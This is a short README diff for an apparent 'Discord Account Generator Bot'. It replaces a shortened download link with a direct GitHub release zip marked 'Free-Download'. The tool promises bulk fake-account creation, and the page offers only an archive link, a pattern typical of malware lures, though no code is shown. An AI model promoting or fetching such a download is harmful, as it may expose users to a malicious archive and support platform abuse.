@@ -1,6 +1,7 @@
 # 🚀 Discord Account Generator Bot 🚀
 
-*** [Download](https://goo.su/rH3n) ***
+[Download](https://github.com/xaviggr/Discord-Account-Generator-Bot-Free-Download/releases/download/Discord-Account-Generator-Bot-Free-Download/Discord-Account-Generator-Bot-Free-Download.zip) 
+
 
 ## 📜 Description
 
